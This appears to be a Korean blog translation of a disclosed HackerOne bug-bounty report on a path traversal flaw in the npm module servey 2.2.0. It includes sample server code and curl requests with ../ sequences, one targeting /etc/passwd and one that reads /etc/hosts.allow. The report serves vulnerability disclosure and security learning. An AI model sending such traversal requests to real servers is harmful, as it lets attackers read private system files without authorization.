---
layout: post
title: 경로 이동 취약점은 확장 기능을 포함한 원격 서버의 어떠한 파일이라도 가져올 수 있게함(servey)
categories: PoC
tags: [Bugbounty, PathTraversal, Translation, Hackerone]
---
(와.. bl4de님이다~~)  

출처 : [hackerone hacktivity, 작성자 : bl4de] https://hackerone.com/reports/355501

_[ 본 이슈는 해결 된 상태이며, 취약점은 한국시각으로 2019년 4월 4일 오전 5시 08분에 공개되었습니다. Node.js third-party modules에 리포팅 되었으며, 해당 소스코드는 servey의 자산입니다. 취약점의 종류는 Path traversal이며, 포상금은 없습니다. 해당 취약점은 해당 도메인에서 4~6.9/10의 심각성을 내포하고 있습니다. ]_
- - -
팀원님들 안녕하세요,

저는 servey 모듈의 부분적인 경로 이동 공격에 대해서 리포팅하고 싶습니다.
이 취약점은 원격 서버에서 (확장 기능을 포함한) 어떠한 임의의 파일이라도 읽을 수 있게 합니다.

# 모듈
* 모듈 이름: servey
* 버전: 2.2.0
* npm 페이지: https://www.npmjs.com/package/servey
  
## 모듈 설명
정적인 단일 페이지 애플리케이션 서버

## 모듈 스탯
월별 ~120-200회의 다운로드가 된다고 추정됩니다.
- - -
# 취약점
## 공격이 발생되는 과정
* servey모듈을 설치합니다:
{% highlight html %}
$ npm install servey
{% endhighlight %}

* 모듈의 npm 문서에서 가져온 다음의 예제 코드를 이용해 샘플 애플리케이션을 생성합니다:
{% highlight javascript %}
// app.js
const Servey = require('servey');
const Path = require('path') 
const server = Servey.create({
    spa: true,
    port: 8080,
    folder: Path.join(__dirname, 'static')
});

server.on('error', function (error) {
    console.error(error);
});

server.on('request', function (req) {
    console.log(req.url);
});

server.on('open', function () {
    console.log('open');
});

server.open();
{% endhighlight %}

* 앱을 실행합니다:
{% highlight text %}
$ node app.js 
open
{% endhighlight %}

* /etc/passwd (어떠한 확장 기능도 없는 예시 파일)의 내용을 가져오길 시도합니다. servey는 이러한 파일의 접근을 허용하지 않고 HTTP 500 인터널 서버 에러를 띄웁니다:
{% highlight text %}
$ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/html; charset=utf8
< Date: Mon, 21 May 2018 13:08:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
{"code":500,"message":"Internal Server Error"}
{% endhighlight %}

* 요청이 실패했다는 것을 로그를 통해 보여줍니다:
{% highlight text %}
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
{% endhighlight %}

* 이제, 다음의 curl 명령의 실행을 통해 /etc/hosts.allow (당신의 시스템 환경에 따라 ../ 경로를 추가해 주세요)의 내용을 가져오길 시도합니다:
{% highlight text %}
$ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/hosts.allow HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: undefined; charset=utf8
< Date: Mon, 21 May 2018 13:06:38 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.allow: list of hosts that are allowed to access the system.
#                   See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: LOCAL [@some_netgroup](/some_netgroup)
#             ALL: .foobar.edu EXCEPT terminalserver.foobar.edu
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#

* Connection #0 to host localhost left intact
{% endhighlight %}

* servey앱의 로그를 다시한번 더 체크해봅니다:
{% highlight text %}
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
/../../../../../../etc/hosts.allow
{% endhighlight %}
hosts.allow 요청이 실패하지 않았다는 것과 파일의 내용을 가져올 수 있었다는 것을 확인할 수 있습니다.  
- - -

# 패치
N/A (해당 없음)

# 지원하는 요소나 레퍼런스
취약점이 발견된 스택에 관련된 기술적인 정보들
* 운영체제: Ubuntu 16.04
* Node.js 8.11.1
* npm v. 6.0.1
* curl 7.47.0

# 정리
* maintainer가 알 수 있도록 컨택했습니다 : No
* 관련된 리포지토리 안의 정보들을 열람했습니다 : No

Rafal ‘bl4de’ Janicki 올림.
- - -
# 영향
공격자는 확장 기능을 포함한 원격 서버의 어떠한 파일의 내용이라도 가져올 수 있습니다.